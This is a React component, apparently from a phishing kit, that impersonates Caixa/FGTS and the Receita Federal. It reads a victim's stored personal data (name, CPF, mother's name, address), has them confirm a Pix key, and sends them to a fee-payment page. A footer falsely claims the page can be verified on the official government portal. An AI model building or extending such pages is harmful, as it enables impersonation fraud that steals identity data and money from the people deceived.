import { useState, useEffect } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import { FaCheckCircle } from "react-icons/fa";
import { UserData } from "../types/userData";

export function SelecionarMetodo() {
    const [pixList, setPixList] = useState<{ chave: string; banco: string; tipo: string }[]>([]);
    const [selectedPix, setSelectedPix] = useState<string | null>(null);

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        nomeMae: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        document.title = "Selecionar Método - Receita Federal";

        // Recupera a lista de chaves do localStorage e seleciona a primeira por padrão
        const storedPixList = JSON.parse(localStorage.getItem("pixList") || "[]");
        setPixList(storedPixList);
        if (storedPixList.length > 0) {
            setSelectedPix(storedPixList[0].chave);
        }
    }, []);

    const handleSelectPix = (chave: string) => {
        setSelectedPix(chave);
        localStorage.setItem("selectedPix", JSON.stringify(chave)); // Armazena a chave selecionada
    };

    return (
        <div className="w-full min-h-screen flex flex-col items-center bg-[#025bab] text-white px-4 pb-8">
            {/* Cabeçalho */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="flex items-center space-x-2 mb-6">
                <h2 className="font-bold text-2xl text-white">Confirme a Chave Pix</h2>
            </div>

            {/* Lista de Chaves Pix */}
            <div className="w-full max-w-md space-y-4 mt-4">
                {pixList.length > 0 ? (
                    pixList.map((pix, index) => (
                        <button
                            key={index}
                            onClick={() => handleSelectPix(pix.chave)}
                            className={`w-full p-4 rounded-lg shadow-lg transition border-2 ${selectedPix === pix.chave
                                ? "border-orange-400 bg-white text-zinc-900"
                                : "border-transparent bg-zinc-100 text-zinc-800"
                                } hover:border-orange-400`}
                        >
                            <div className="flex flex-col space-y-1 text-left">
                                <div className="flex justify-between items-center">
                                    <span className="font-semibold">{pix.banco}</span>
                                    {selectedPix === pix.chave && (
                                        <FaCheckCircle className="text-green-500" />
                                    )}
                                </div>
                                <span className="text-sm text-zinc-600">Tipo: {pix.tipo}</span>
                                <span className="text-sm text-zinc-600">Chave: {pix.chave}</span>
                            </div>
                        </button>
                    ))
                ) : (
                    <p className="text-center text-sm text-zinc-200 mt-8">
                        Nenhuma chave Pix cadastrada.
                    </p>
                )}
            </div>

            {/* Botão de Confirmação */}
            <a href="/pagamentotarifa" className="w-full">
                <button
                    className="bg-orange-400 w-full max-w-md py-3 mt-6 font-bold rounded-md text-white transition duration-200 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300"
                >
                    CONFIRMAR MÉTODO DE PAGAMENTO
                </button>
            </a>

            <a href="/cadastrourgente"
                className="w-full"
            >
                <button
                    className="border bg-transparent border-zinc-300 w-full max-w-md py-3 mt-2 font-bold rounded-md text-white transition duration-200 focus:outline-none focus:ring-2 focus:ring-orange-300"
                >
                    CADASTRAR OUTRA CHAVE
                </button>
            </a>

            {/* Rodapé */}
            <div className="mt-8 text-center px-4">
                <h2 className="text-lg text-zinc-300 font-medium">Autenticação do Documento</h2>
                <p className="text-sm text-zinc-400">
                    A verificação pode ser realizada no portal oficial da Receita Federal.
                </p>
            </div>
        </div>
    );
}
